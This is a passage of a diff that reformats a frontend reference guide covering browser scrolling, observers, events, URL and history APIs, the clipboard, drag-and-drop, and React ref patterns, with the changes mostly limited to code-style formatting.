 const atBottom = el.scrollHeight - el.scrollTop - el.clientHeight < 1;
 
 // ── Writing ─────────────────────────────────────────────────────────────────
-window.scrollTo({ top: 0, behavior: 'smooth' });  // absolute
+window.scrollTo({ top: 0, behavior: 'smooth' }); // absolute
 window.scrollBy({ top: 300, behavior: 'smooth' }); // relative
-el.scrollTop = el.scrollHeight;                    // jump a chat log to the bottom
+el.scrollTop = el.scrollHeight; // jump a chat log to the bottom
 
 el.scrollIntoView({
-  behavior: 'smooth',    // or 'auto' / 'instant'
-  block: 'nearest',      // vertical: 'start' | 'center' | 'end' | 'nearest'
-  inline: 'nearest',     // horizontal
+  behavior: 'smooth', // or 'auto' / 'instant'
+  block: 'nearest', // vertical: 'start' | 'center' | 'end' | 'nearest'
+  inline: 'nearest', // horizontal
 });
 // ‼️ block: 'nearest' = scroll only if needed, minimally. Best for keyboard-highlighted
 //    list items. 'start' always moves it to the top (jarring in lists).
@@ -1358,22 +1589,39 @@ el.scrollIntoView({
 
 ```css
 /* Leave room for a sticky header when scrolling to anchors / scrollIntoView */
-html { scroll-padding-top: 64px; }
+html {
+  scroll-padding-top: 64px;
+}
 /* or per target */
-h2  { scroll-margin-top: 64px; }
+h2 {
+  scroll-margin-top: 64px;
+}
 
 /* Smooth scroll for anchor links — respect reduced motion */
-@media (prefers-reduced-motion: no-preference) { html { scroll-behavior: smooth; } }
+@media (prefers-reduced-motion: no-preference) {
+  html {
+    scroll-behavior: smooth;
+  }
+}
 
 /* Stop scroll chaining: scrolling a modal/sidebar to its end won't scroll the page */
-.modal-body { overscroll-behavior: contain; }
+.modal-body {
+  overscroll-behavior: contain;
+}
 
 /* Snap carousels without JS */
-.carousel { scroll-snap-type: x mandatory; overflow-x: auto; }
-.slide    { scroll-snap-align: start; }
+.carousel {
+  scroll-snap-type: x mandatory;
+  overflow-x: auto;
+}
+.slide {
+  scroll-snap-align: start;
+}
 
 /* Reserve space for the scrollbar so content doesn't jump when it appears/disappears */
-html { scrollbar-gutter: stable; }
+html {
+  scrollbar-gutter: stable;
+}
 ```
 
 ```text
@@ -1406,7 +1654,7 @@ html { scrollbar-gutter: stable; }
 function lockScroll() {
   const scrollbar = window.innerWidth - document.documentElement.clientWidth;
   document.documentElement.style.overflow = 'hidden';
-  document.documentElement.style.paddingRight = `${scrollbar}px`;  // fill the gap
+  document.documentElement.style.paddingRight = `${scrollbar}px`; // fill the gap
 }
 function unlockScroll() {
   document.documentElement.style.overflow = '';
@@ -1417,7 +1665,7 @@ function unlockScroll() {
 // route. See BROWSER-COMPATIBILITY-DEEP §11.
 
 // ── Scroll restoration on navigation (SPAs) ─────────────────────────────────
-history.scrollRestoration = 'manual';  // you restore positions yourself
+history.scrollRestoration = 'manual'; // you restore positions yourself
 // React Router: <ScrollRestoration /> component handles it.
 ```
 
@@ -1456,15 +1704,16 @@ window.addEventListener('resize', onResize);
 
 // ── matchMedia — breakpoints and user preferences in JS ─────────────────────
 const mq = window.matchMedia('(min-width: 768px)');
-mq.matches;                                   // true/false right now
-mq.addEventListener('change', (e) => {        // ‼️ addListener() is the deprecated form
+mq.matches; // true/false right now
+mq.addEventListener('change', e => {
+  // ‼️ addListener() is the deprecated form
   setIsDesktop(e.matches);
 });
 
 window.matchMedia('(prefers-color-scheme: dark)').matches;
 window.matchMedia('(prefers-reduced-motion: reduce)').matches;
-window.matchMedia('(hover: hover) and (pointer: fine)').matches;  // a real mouse
-window.matchMedia('(display-mode: standalone)').matches;          // installed PWA
+window.matchMedia('(hover: hover) and (pointer: fine)').matches; // a real mouse
+window.matchMedia('(display-mode: standalone)').matches; // installed PWA
 
 // ── visualViewport — the part actually visible on mobile ────────────────────
 // When the on-screen keyboard opens (iOS especially) or the user pinch-zooms,
@@ -1482,13 +1731,14 @@ import { useSyncExternalStore } from 'react';
 
 function useMediaQuery(query) {
   return useSyncExternalStore(
-    (onChange) => {                                 // subscribe
+    onChange => {
+      // subscribe
       const mq = window.matchMedia(query);
       mq.addEventListener('change', onChange);
       return () => mq.removeEventListener('change', onChange);
     },
-    () => window.matchMedia(query).matches,         // getSnapshot (client)
-    () => false,                                    // getServerSnapshot (SSR) — pick a default
+    () => window.matchMedia(query).matches, // getSnapshot (client)
+    () => false, // getServerSnapshot (SSR) — pick a default
   );
 }
 // const isDesktop = useMediaQuery('(min-width: 768px)');
@@ -1497,7 +1747,7 @@ function useMediaQuery(query) {
 
 function useWindowWidth() {
   return useSyncExternalStore(
-    (onChange) => {
+    onChange => {
       window.addEventListener('resize', onChange);
       return () => window.removeEventListener('resize', onChange);
     },
@@ -1512,9 +1762,14 @@ function useWindowWidth() {
 ```css
 /* Container queries — style a component by ITS OWN width, not the window's.
    Often removes the need for ResizeObserver entirely. */
-.card-wrapper { container-type: inline-size; }
+.card-wrapper {
+  container-type: inline-size;
+}
 @container (min-width: 400px) {
-  .card { display: grid; grid-template-columns: 120px 1fr; }
+  .card {
+    display: grid;
+    grid-template-columns: 120px 1fr;
+  }
 }
 ```
 
@@ -1526,15 +1781,15 @@ All three share the same shape: create with a callback, `observe(el)`, `unobserv
 
 ```js
 // ── ResizeObserver — "this element's size changed" ──────────────────────────
-const ro = new ResizeObserver((entries) => {
+const ro = new ResizeObserver(entries => {
   for (const entry of entries) {
-    entry.target;                              // the element
-    entry.contentRect.width;                   // content box (no padding/border)
-    entry.borderBoxSize[0].inlineSize;         // border box width (writing-mode aware)
-    entry.borderBoxSize[0].blockSize;          // border box height
+    entry.target; // the element
+    entry.contentRect.width; // content box (no padding/border)
+    entry.borderBoxSize[0].inlineSize; // border box width (writing-mode aware)
+    entry.borderBoxSize[0].blockSize; // border box height
   }
 });
-ro.observe(el);                                // fires once immediately, then on changes
+ro.observe(el); // fires once immediately, then on changes
 ro.observe(el, { box: 'border-box' });
 ro.disconnect();
 
@@ -1547,19 +1802,22 @@ ro.disconnect();
 
 ```js
 // ── IntersectionObserver — "this element entered/left the viewport (or a container)" ──
-const io = new IntersectionObserver((entries) => {
-  for (const entry of entries) {
-    if (entry.isIntersecting) {
-      loadMore();                              // infinite scroll sentinel
-      // io.unobserve(entry.target);           // lazy-load once
+const io = new IntersectionObserver(
+  entries => {
+    for (const entry of entries) {
+      if (entry.isIntersecting) {
+        loadMore(); // infinite scroll sentinel
+        // io.unobserve(entry.target);           // lazy-load once
+      }
+      entry.intersectionRatio; // 0..1 how much is visible
     }
-    entry.intersectionRatio;                   // 0..1 how much is visible
-  }
-}, {
-  root: null,              // null = viewport; or a scrolling container element
-  rootMargin: '200px',     // grow the root: trigger 200px BEFORE it's visible
-  threshold: [0, 0.5, 1],  // fire when crossing these visibility ratios
-});
+  },
+  {
+    root: null, // null = viewport; or a scrolling container element
+    rootMargin: '200px', // grow the root: trigger 200px BEFORE it's visible
+    threshold: [0, 0.5, 1], // fire when crossing these visibility ratios
+  },
+);
 io.observe(sentinel);
 // Uses: infinite scroll, lazy loading, analytics "was seen", pause videos off-screen,
 // "is the sticky header stuck" (observe a 1px sentinel above it), active TOC section.
@@ -1567,18 +1825,21 @@ io.observe(sentinel);
 
 ```js
 // ── MutationObserver — "the DOM under this node changed" ────────────────────
-const mo = new MutationObserver((mutations) => {
+const mo = new MutationObserver(mutations => {
   for (const m of mutations) {
-    m.type;            // 'childList' | 'attributes' | 'characterData'
-    m.addedNodes; m.removedNodes; m.attributeName; m.oldValue;
+    m.type; // 'childList' | 'attributes' | 'characterData'
+    m.addedNodes;
+    m.removedNodes;
+    m.attributeName;
+    m.oldValue;
   }
 });
 mo.observe(container, {
-  childList: true,      // children added/removed
-  subtree: true,        // ...anywhere below, not just direct children
-  attributes: true,     // attribute changes
+  childList: true, // children added/removed
+  subtree: true, // ...anywhere below, not just direct children
+  attributes: true, // attribute changes
   attributeFilter: ['class', 'aria-expanded'],
-  characterData: true,  // text changes
+  characterData: true, // text changes
 });
 mo.disconnect();
 // In React apps you rarely need it — you know when your DOM changes. Used for:
@@ -1590,14 +1851,14 @@ mo.disconnect();
 // element mounts later or is swapped for another node)
 function useElementSize() {
   const [size, setSize] = useState({ width: 0, height: 0 });
-  const ref = useCallback((node) => {
+  const ref = useCallback(node => {
     if (!node) return;
     const ro = new ResizeObserver(([entry]) => {
       const { inlineSize: width, blockSize: height } = entry.borderBoxSize[0];
       setSize({ width, height });
     });
     ro.observe(node);
-    return () => ro.disconnect();   // React 19: ref callbacks may return a cleanup
+    return () => ro.disconnect(); // React 19: ref callbacks may return a cleanup
   }, []);
   return [ref, size];
 }
@@ -1655,14 +1916,27 @@ WHAT HAPPENS AFTER YOU CHANGE THE DOM (one frame, ~16.7ms at 60Hz):
 
 ```css
 /* Animate cheaply */
-.panel { transition: transform 200ms, opacity 200ms; }   /* ✅ composite only */
-.panel { transition: left 200ms, height 200ms; }         /* ❌ layout every frame */
+.panel {
+  transition:
+    transform 200ms,
+    opacity 200ms;
+} /* ✅ composite only */
+.panel {
+  transition:
+    left 200ms,
+    height 200ms;
+} /* ❌ layout every frame */
 
 /* Hint a layer ahead of a known animation — sparingly, it costs memory */
-.drawer { will-change: transform; }
+.drawer {
+  will-change: transform;
+}
 
 /* Skip rendering work for off-screen sections of long pages */
-.section { content-visibility: auto; contain-intrinsic-size: auto 600px; }
+.section {
+  content-visibility: auto;
+  contain-intrinsic-size: auto 600px;
+}
 ```
 
 See [../2-medium-priority/BROWSER-INTERNALS-DEEP.md](../2-medium-priority/BROWSER-INTERNALS-DEEP.md#browser-rendering-pipeline-detailed) and [../2-medium-priority/PERFORMANCE-DEEP.md](../2-medium-priority/PERFORMANCE-DEEP.md).
@@ -1707,8 +1981,8 @@ See [../2-medium-priority/BROWSER-INTERNALS-DEEP.md](../2-medium-priority/BROWSE
 function animate(el, from, to, duration) {
   const start = performance.now();
   function frame(now) {
-    const t = Math.min((now - start) / duration, 1);   // 0 → 1
-    const eased = 1 - (1 - t) ** 3;                     // easeOutCubic
+    const t = Math.min((now - start) / duration, 1); // 0 → 1
+    const eased = 1 - (1 - t) ** 3; // easeOutCubic
     el.style.transform = `translateX(${from + (to - from) * eased}px)`;
     if (t < 1) requestAnimationFrame(frame);
   }
@@ -1764,26 +2038,33 @@ async function processAll(items) {
 function debounce(fn, ms) {
   let id;
   const debounced = (...args) => {
-    clearTimeout(id);                    // every call resets the timer
+    clearTimeout(id); // every call resets the timer
     id = setTimeout(() => fn(...args), ms);
   };
-  debounced.cancel = () => clearTimeout(id);   // ‼️ call on unmount
+  debounced.cancel = () => clearTimeout(id); // ‼️ call on unmount
   return debounced;
 }
 
 function rafThrottle(fn) {
-  let frame = 0, lastArgs;
+  let frame = 0,
+    lastArgs;
   const throttled = (...args) => {
-    lastArgs = args;                     // always use the newest event
-    if (frame) return;                   // already scheduled for this frame
-    frame = requestAnimationFrame(() => { frame = 0; fn(...lastArgs); });
+    lastArgs = args; // always use the newest event
+    if (frame) return; // already scheduled for this frame
+    frame = requestAnimationFrame(() => {
+      frame = 0;
+      fn(...lastArgs);
+    });
   };
   throttled.cancel = () => cancelAnimationFrame(frame);
   return throttled;
 }
 
-window.addEventListener('scroll', rafThrottle(() => updateProgress(window.scrollY)),
-                        { passive: true });
+window.addEventListener(
+  'scroll',
+  rafThrottle(() => updateProgress(window.scrollY)),
+  { passive: true },
+);
 ```
 
 ```jsx
@@ -1794,15 +2075,24 @@ function Search() {
   const [results, setResults] = useState([]);
 
   // useMemo keeps the same debounced instance across renders
-  const search = useMemo(() => debounce(async (q) => {
-    setResults(await api.search(q));
-  }, 300), []);
-  useEffect(() => () => search.cancel(), [search]);   // cancel on unmount
+  const search = useMemo(
+    () =>
+      debounce(async q => {
+        setResults(await api.search(q));
+      }, 300),
+    [],
+  );
+  useEffect(() => () => search.cancel(), [search]); // cancel on unmount
 
-  return <input value={query} onChange={(e) => {
-    setQuery(e.target.value);      // the input updates immediately (controlled)
-    search(e.target.value);        // the fetch is debounced
-  }} />;
+  return (
+    <input
+      value={query}
+      onChange={e => {
+        setQuery(e.target.value); // the input updates immediately (controlled)
+        search(e.target.value); // the fetch is debounced
+      }}
+    />
+  );
 }
 
 // Often cleaner: debounce the VALUE, and let an effect / TanStack Query react to it.
@@ -1810,7 +2100,7 @@ function useDebouncedValue(value, ms) {
   const [debounced, setDebounced] = useState(value);
   useEffect(() => {
     const id = setTimeout(() => setDebounced(value), ms);
-    return () => clearTimeout(id);   // each new value clears the previous timer
+    return () => clearTimeout(id); // each new value clears the previous timer
   }, [value, ms]);
   return debounced;
 }
@@ -1875,8 +2165,8 @@ function onReady(fn) {
 ```js
 // Warn about unsaved changes
 function onBeforeUnload(e) {
-  e.preventDefault();          // modern way to trigger the prompt
-  e.returnValue = '';          // legacy browsers need this
+  e.preventDefault(); // modern way to trigger the prompt
+  e.returnValue = ''; // legacy browsers need this
 }
 if (isDirty) window.addEventListener('beforeunload', onBeforeUnload);
 else window.removeEventListener('beforeunload', onBeforeUnload);
@@ -1886,37 +2176,63 @@ else window.removeEventListener('beforeunload', onBeforeUnload);
 
 // Pause work while hidden
 document.addEventListener('visibilitychange', () => {
-  if (document.hidden) stopPolling(); else startPolling();
+  if (document.hidden) stopPolling();
+  else startPolling();
 });
 
 // Refresh state when coming back from bfcache
-window.addEventListener('pageshow', (e) => {
+window.addEventListener('pageshow', e => {
   if (e.persisted) refetchUser();
 });
 ```
 
-| Window event | When | Typical use |
-|---|---|---|
-| `online` / `offline` | network connectivity changes (`navigator.onLine`) | show "You're offline" banner, retry queue |
-| `storage` | ‼️ **another tab** changed localStorage | sync logout / theme across tabs |
-| `focus` / `blur` (window) | tab/window gained or lost focus | refetch on focus (TanStack Query does this) |
-| `error` | uncaught exception (also resource load errors in capture phase) | error reporting |
-| `unhandledrejection` | a Promise rejected with no `.catch` | error reporting |
-| `hashchange` | `#fragment` changed | old hash routers |
-| `popstate` | back/forward between history entries | routers (§22) |
-| `message` | `postMessage` from iframe/popup/worker | ‼️ always check `e.origin` |
-| `copy` / `paste` | clipboard (on document) | §23 |
-| `beforeprint` / `afterprint` | print dialog | expand collapsed content |
-| `languagechange` | user changed browser language | |
+```text
+  WINDOW EVENT             WHEN IT FIRES                          TYPICAL USE
+  ───────────────────────  ─────────────────────────────────────  ─────────────────────────
+  CONNECTION & TABS
+
+  online / offline         network connectivity changes           "You're offline" banner,
+                           (navigator.onLine)                     retry queue
+  ‼️ storage               ANOTHER TAB changed localStorage       sync logout / theme
+                           (never the tab that made the change)   across tabs
+  focus / blur (window)    tab/window gained or lost focus        refetch on focus
+                                                                  (TanStack Query does this)
+
+
+  ERRORS
+
+  error                    uncaught exception (also resource      error reporting
+                           load errors, in the capture phase)
+  unhandledrejection       a Promise rejected with no .catch      error reporting
+
+
+  NAVIGATION
+
+  hashchange               the #fragment changed                  old hash routers
+  popstate                 back/forward between history entries   routers (§22)
+
+
+  MESSAGES & CLIPBOARD
+
+  ‼️ message               postMessage from iframe/popup/worker   ALWAYS check e.origin
+  copy / paste             clipboard (on document)                §23
+
+
+  OTHER
+
+  beforeprint /            print dialog opens / closes            expand collapsed content
+  afterprint
+  languagechange           user changed the browser language
+```
 
 ```js
-window.addEventListener('message', (e) => {
-  if (e.origin !== 'https://trusted.example.com') return;   // ‼️ never skip this
+window.addEventListener('message', e => {
+  if (e.origin !== 'https://trusted.example.com') return; // ‼️ never skip this
   handle(e.data);
 });
 
-window.addEventListener('error', (e) => report(e.error ?? e.message));
-window.addEventListener('unhandledrejection', (e) => report(e.reason));
+window.addEventListener('error', e => report(e.error ?? e.message));
+window.addEventListener('unhandledrejection', e => report(e.reason));
 // Note: React error boundaries only catch errors during rendering — not in event
 // handlers or async code. These window listeners catch the rest.
 ```
@@ -1927,32 +2243,34 @@ window.addEventListener('unhandledrejection', (e) => report(e.reason));
 
 ```js
 // ── Reading the URL ─────────────────────────────────────────────────────────
-location.href;       // "https://app.com/tasks/7?tab=notes#top"
-location.origin;     // "https://app.com"
-location.pathname;   // "/tasks/7"
-location.search;     // "?tab=notes"
-location.hash;       // "#top"
+location.href; // "https://app.com/tasks/7?tab=notes#top"
+location.origin; // "https://app.com"
+location.pathname; // "/tasks/7"
+location.search; // "?tab=notes"
+location.hash; // "#top"
 
 const params = new URLSearchParams(location.search);
-params.get('tab');            // "notes"  (null if missing)
-params.getAll('tag');         // repeated keys ?tag=a&tag=b
-params.set('page', '2');      // values are strings
-params.toString();            // "tab=notes&page=2" — encoding done for you
+params.get('tab'); // "notes"  (null if missing)
+params.getAll('tag'); // repeated keys ?tag=a&tag=b
+params.set('page', '2'); // values are strings
+params.toString(); // "tab=notes&page=2" — encoding done for you
 
-const url = new URL('/api/tasks', location.origin);   // ‼️ build URLs, don't concat strings
-url.searchParams.set('q', 'milk & eggs');             // safely encoded
+const url = new URL('/api/tasks', location.origin); // ‼️ build URLs, don't concat strings
+url.searchParams.set('q', 'milk & eggs'); // safely encoded
 fetch(url);
 
 // ── Changing it ─────────────────────────────────────────────────────────────
-location.assign('/login');        // navigate (adds history entry) — full page load
-location.replace('/login');       // navigate without a history entry (redirects)
+location.assign('/login'); // navigate (adds history entry) — full page load
+location.replace('/login'); // navigate without a history entry (redirects)
 location.reload();
 
-history.pushState(state, '', '/tasks/8');     // change URL, NO page load, adds entry
-history.replaceState(state, '', '?tab=files');// change URL, no new entry
-history.back(); history.forward(); history.go(-2);
+history.pushState(state, '', '/tasks/8'); // change URL, NO page load, adds entry
+history.replaceState(state, '', '?tab=files'); // change URL, no new entry
+history.back();
+history.forward();
+history.go(-2);
 
-window.addEventListener('popstate', (e) => {
+window.addEventListener('popstate', e => {
   // ‼️ fires on back/forward ONLY — not when you call pushState/replaceState yourself
   render(location.pathname, e.state);
 });
@@ -1976,16 +2294,19 @@ history + popstate for SPAs. Shipped in Chromium first; check support before rel
 ```js
 // ── Text selection ──────────────────────────────────────────────────────────
 const sel = window.getSelection();
-sel.toString();                 // the selected text
-sel.rangeCount && sel.getRangeAt(0).getBoundingClientRect();  // where it is → position a
-                                                              // "highlight / comment" popup
-document.addEventListener('selectionchange', () => { /* selection moved */ });
+sel.toString(); // the selected text
+sel.rangeCount && sel.getRangeAt(0).getBoundingClientRect(); // where it is → position a
+// "highlight / comment" popup
+document.addEventListener('selectionchange', () => {
+  /* selection moved */
+});
 sel.removeAllRanges();
 
 // Select all text in an element (e.g. "click to select code")
 const range = document.createRange();
 range.selectNodeContents(codeEl);
-sel.removeAllRanges(); sel.addRange(range);
+sel.removeAllRanges();
+sel.addRange(range);
 
 // Inputs have their own selection API
 input.select();
@@ -2004,20 +2325,24 @@ async function copy(text) {
     toast('Copy failed — select and press Ctrl+C');
   }
 }
-const text = await navigator.clipboard.readText();     // prompts / may be denied
+const text = await navigator.clipboard.readText(); // prompts / may be denied
 
 // Clipboard EVENTS — customise what the user copies/pastes
-document.addEventListener('copy', (e) => {
+document.addEventListener('copy', e => {
   e.clipboardData.setData('text/plain', getSelection() + '\n— from MyApp');
   e.preventDefault();
 });
-editor.addEventListener('paste', (e) => {
-  const files = [...e.clipboardData.files];            // pasted screenshots
-  if (files.length) { e.preventDefault(); upload(files); return; }
-  const text = e.clipboardData.getData('text/plain');  // paste as plain text
+editor.addEventListener('paste', e => {
+  const files = [...e.clipboardData.files]; // pasted screenshots
+  if (files.length) {
+    e.preventDefault();
+    upload(files);
+    return;
+  }
+  const text = e.clipboardData.getData('text/plain'); // paste as plain text
   e.preventDefault();
-  document.execCommand('insertText', false, text);     // deprecated but still the
-                                                       // practical way in contenteditable
+  document.execCommand('insertText', false, text); // deprecated but still the
+  // practical way in contenteditable
 });
 ```
 
@@ -2049,21 +2374,31 @@ editor.addEventListener('paste', (e) => {
 ```jsx
 function Dropzone({ onFiles }) {
   const [over, setOver] = useState(false);
-  const depth = useRef(0);   // counts nested dragenter/dragleave to avoid flicker
+  const depth = useRef(0); // counts nested dragenter/dragleave to avoid flicker
   return (
     <div
       className={over ? 'dropzone over' : 'dropzone'}
-      onDragEnter={(e) => { e.preventDefault(); depth.current++; setOver(true); }}
-      onDragOver={(e) => e.preventDefault()}          // ‼️ required to allow the drop
-      onDragLeave={() => { if (--depth.current === 0) setOver(false); }}
-      onDrop={(e) => {
-        e.preventDefault();                            // stop the browser opening the file
-        depth.current = 0; setOver(false);
+      onDragEnter={e => {
+        e.preventDefault();
+        depth.current++;
+        setOver(true);
+      }}
+      onDragOver={e => e.preventDefault()} // ‼️ required to allow the drop
+      onDragLeave={() => {
+        if (--depth.current === 0) setOver(false);
+      }}
+      onDrop={e => {
+        e.preventDefault(); // stop the browser opening the file
+        depth.current = 0;
+        setOver(false);
         onFiles([...e.dataTransfer.files]);
       }}
     >
-      Drop files here, or <label>browse<input type="file" multiple hidden
-        onChange={(e) => onFiles([...e.target.files])} /></label>
+      Drop files here, or{' '}
+      <label>
+        browse
+        <input type='file' multiple hidden onChange={e => onFiles([...e.target.files])} />
+      </label>
     </div>
   );
 }
@@ -2076,18 +2411,18 @@ function Dropzone({ onFiles }) {
 ```js
 // ── Dispatch your own events on DOM nodes ───────────────────────────────────
 const ev = new CustomEvent('cart:updated', {
-  detail: { count: 3 },   // your payload lives in .detail
-  bubbles: true,          // default false! — set true if ancestors should hear it
-  composed: true,         // cross shadow DOM boundaries (web components)
-  cancelable: true,       // lets listeners call preventDefault
+  detail: { count: 3 }, // your payload lives in .detail
+  bubbles: true, // default false! — set true if ancestors should hear it
+  composed: true, // cross shadow DOM boundaries (web components)
+  cancelable: true, // lets listeners call preventDefault
 });
-const notCancelled = el.dispatchEvent(ev);   // returns false if a listener preventDefault'ed
+const notCancelled = el.dispatchEvent(ev); // returns false if a listener preventDefault'ed
 // ‼️ dispatchEvent is SYNCHRONOUS — all listeners run before it returns.
 
-document.addEventListener('cart:updated', (e) => updateBadge(e.detail.count));
+document.addEventListener('cart:updated', e => updateBadge(e.detail.count));
 
 // ── Simulating user events ──────────────────────────────────────────────────
-button.click();                                   // fires a real click (isTrusted: false)
+button.click(); // fires a real click (isTrusted: false)
 el.dispatchEvent(new MouseEvent('click', { bubbles: true }));
 input.dispatchEvent(new Event('input', { bubbles: true }));
 el.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }));
@@ -2105,7 +2440,7 @@ class Store extends EventTarget {
   }
 }
 const store = new Store();
-store.addEventListener('change', (e) => console.log(e.detail));
+store.addEventListener('change', e => console.log(e.detail));
 ```
 
 ```text
@@ -2122,7 +2457,7 @@ and browser extensions.
 ```jsx
 // ── useRef: a box whose .current React fills with the DOM node ──────────────
 function SearchBox() {
-  const inputRef = useRef(null);     // TS: useRef<HTMLInputElement>(null)
+  const inputRef = useRef(null); // TS: useRef<HTMLInputElement>(null)
   // During render inputRef.current is null on the first render (the node doesn't exist yet).
   // ‼️ Only read/use it in event handlers and effects — never during render.
   return (
@@ -2153,29 +2488,38 @@ function SearchBox() {
 // appears, you have a list of nodes, or you need to measure on mount.
 function AutoMeasure() {
   const [height, setHeight] = useState(0);
-  const measuredRef = useCallback((node) => {
+  const measuredRef = useCallback(node => {
     if (node) setHeight(node.getBoundingClientRect().height);
   }, []);
   return <div ref={measuredRef}>...</div>;
 }
 
 // React 19: a ref callback can return a cleanup function (like an effect)
-<div ref={(node) => {
-  const ro = new ResizeObserver(onResize);
-  ro.observe(node);
-  return () => ro.disconnect();     // runs when the node detaches
-}} />
+<div
+  ref={node => {
+    const ro = new ResizeObserver(onResize);
+    ro.observe(node);
+    return () => ro.disconnect(); // runs when the node detaches
+  }}
+/>;
 // ‼️ An inline ref callback is a new function every render → React calls the old one's
 // cleanup and the new one each render. Wrap in useCallback if that work is expensive.
 
 // ── Refs to many items ──────────────────────────────────────────────────────
 const itemRefs = useRef(new Map());
-{items.map(item => (
-  <li key={item.id} ref={(node) => {
-    if (node) itemRefs.current.set(item.id, node);
-    else itemRefs.current.delete(item.id);
-  }}>{item.label}</li>
-))}
+{
+  items.map(item => (
+    <li
+      key={item.id}
+      ref={node => {
+        if (node) itemRefs.current.set(item.id, node);
+        else itemRefs.current.delete(item.id);
+      }}
+    >
+      {item.label}
+    </li>
+  ));
+}
 // later: itemRefs.current.get(activeId)?.scrollIntoView({ block: 'nearest' });
 ```
 
@@ -2183,21 +2527,35 @@ const itemRefs = useRef(new Map());
 // ── Passing a ref to YOUR component ─────────────────────────────────────────
 // React 19: ref is a normal prop for function components
 function TextField({ label, ref, ...props }) {
-  return <label>{label}<input ref={ref} {...props} /></label>;
+  return (
+    <label>
+      {label}
+      <input ref={ref} {...props} />
+    </label>
+  );
 }
 // React 18 and earlier: wrap in forwardRef
 const TextField18 = forwardRef(function TextField({ label, ...props }, ref) {
-  return <label>{label}<input ref={ref} {...props} /></label>;
+  return (
+    <label>
+      {label}
+      <input ref={ref} {...props} />
+    </label>
+  );
 });
 
 // ── Exposing a limited API instead of the raw node ──────────────────────────
 function VideoPlayer({ src, ref }) {
   const videoRef = useRef(null);
-  useImperativeHandle(ref, () => ({
-    play: () => videoRef.current.play(),
-    pause: () => videoRef.current.pause(),
-    // parent can't do videoRef.current.remove() or change styles — only these
-  }), []);
+  useImperativeHandle(
+    ref,
+    () => ({
+      play: () => videoRef.current.play(),
+      pause: () => videoRef.current.pause(),
+      // parent can't do videoRef.current.remove() or change styles — only these
+    }),
+    [],
+  );
   return <video ref={videoRef} src={src} />;
 }
 ```
@@ -2208,12 +2566,17 @@ function Chart({ data }) {
   const containerRef = useRef(null);
   const chartRef = useRef(null);
 
-  useEffect(() => {                         // create once
+  useEffect(() => {
+    // create once
     chartRef.current = new ChartLib(containerRef.current);
-    return () => { chartRef.current.destroy(); chartRef.current = null; };
+    return () => {
+      chartRef.current.destroy();
+      chartRef.current = null;
+    };
   }, []);
 
-  useEffect(() => {                         // push updates
+  useEffect(() => {
+    // push updates
     chartRef.current?.setData(data);
   }, [data]);
 
@@ -2276,7 +2639,9 @@ function useEscape(onEscape) {
 function useEventListener(target, type, handler, options) {
   // Keep the newest handler without re-subscribing every render
   const handlerRef = useRef(handler);
-  useLayoutEffect(() => { handlerRef.current = handler; });
+  useLayoutEffect(() => {
+    handlerRef.current = handler;
+  });
 
   // Pull primitives out so a new options object each render doesn't re-subscribe
   const capture = options?.capture ?? false;
@@ -2288,9 +2653,8 @@ function useEventListener(target, type, handler, options) {
     const el = target && 'current' in target ? target.current : target;
     if (!el?.addEventListener) return;
     const controller = new AbortController();
-    el.addEventListener(type, (e) => handlerRef.current(e),
-      { capture, passive, once, signal: controller.signal });
-    return () => controller.abort();          // removes it, no reference juggling
+    el.addEventListener(type, e => handlerRef.current(e), { capture, passive, once, signal: controller.signal });
+    return () => controller.abort(); // removes it, no reference juggling
   }, [target, type, capture, passive, once]);
 }
 
@@ -2340,17 +2704,25 @@ function Tooltip({ anchorRect, children }) {
   const [placement, setPlacement] = useState('below');
 
   useLayoutEffect(() => {
-    const h = ref.current.getBoundingClientRect().height;   // measure
+    const h = ref.current.getBoundingClientRect().height; // measure
     const roomBelow = window.innerHeight - anchorRect.bottom;
-    setPlacement(roomBelow < h + 8 ? 'above' : 'below');    // re-render BEFORE paint
+    setPlacement(roomBelow < h + 8 ? 'above' : 'below'); // re-render BEFORE paint
   }, [anchorRect]);
 
   const top = placement === 'below' ? anchorRect.bottom + 8 : anchorRect.top - 8;
   return (
-    <div ref={ref} role="tooltip" style={{
-      position: 'fixed', left: anchorRect.left, top,
-      transform: placement === 'above' ? 'translateY(-100%)' : undefined,
-    }}>{children}</div>
+    <div
+      ref={ref}
+      role='tooltip'
+      style={{
+        position: 'fixed',
+        left: anchorRect.left,
+        top,
+        transform: placement === 'above' ? 'translateY(-100%)' : undefined,
+      }}
+    >
+      {children}
+    </div>
   );
 }
 // With useEffect instead, the user would briefly see it below, then it jumps above.
@@ -2364,7 +2736,7 @@ function Chat() {
   const listRef = useRef(null);
   function send(text) {
     flushSync(() => {
-      setMessages(m => [...m, text]);   // React updates the DOM synchronously
+      setMessages(m => [...m, text]); // React updates the DOM synchronously
     });
     // ‼️ Without flushSync the new message isn't in the DOM yet on this line —
     // state updates are batched and applied after the handler.
@@ -2385,7 +2757,7 @@ function Chat() {
 import { createPortal } from 'react-dom';
 
 function Modal({ children }) {
-  return createPortal(<div className="modal">{children}</div>, document.body);
+  return createPortal(<div className='modal'>{children}</div>, document.body);
 }
 ```
 
@@ -2454,7 +2826,7 @@ function useIsClient() {
 //    snapshot during hydration, then re-renders with the real value.
 
 // ✅ For values that legitimately differ (timestamps), silence that one element:
-<time suppressHydrationWarning>{new Date().toLocaleTimeString()}</time>
+<time suppressHydrationWarning>{new Date().toLocaleTimeString()}</time>;
 
 // ✅ Client-only component in Next.js
 // const Map = dynamic(() => import('./Map'), { ssr: false });   // inside a Client Component
@@ -2477,7 +2849,9 @@ More: [../2-medium-priority/NEXTJS-DEEP.md](../2-medium-priority/NEXTJS-DEEP.md)
 ```jsx
 function useClickOutside(refs, onOutside, enabled = true) {
   const cb = useRef(onOutside);
-  useLayoutEffect(() => { cb.current = onOutside; });
+  useLayoutEffect(() => {
+    cb.current = onOutside;
+  });
 
   useEffect(() => {
     if (!enabled) return;
@@ -2491,7 +2865,7 @@ function useClickOutside(refs, onOutside, enabled = true) {
     // ‼️ capture: true → runs even if something inside the app calls stopPropagation
     document.addEventListener('pointerdown', onPointerDown, true);
     return () => document.removeEventListener('pointerdown', onPointerDown, true);
-  }, [enabled, ...refs]);   // refs are stable objects; listed so the lint rule is happy
+  }, [enabled, ...refs]); // refs are stable objects; listed so the lint rule is happy
 }
 
 // Pass the trigger too, so clicking the toggle button doesn't close-then-reopen:
@@ -2505,33 +2879,69 @@ function useClickOutside(refs, onOutside, enabled = true) {
 function Menu({ label, items }) {
   const [open, setOpen] = useState(false);
   const [active, setActive] = useState(0);
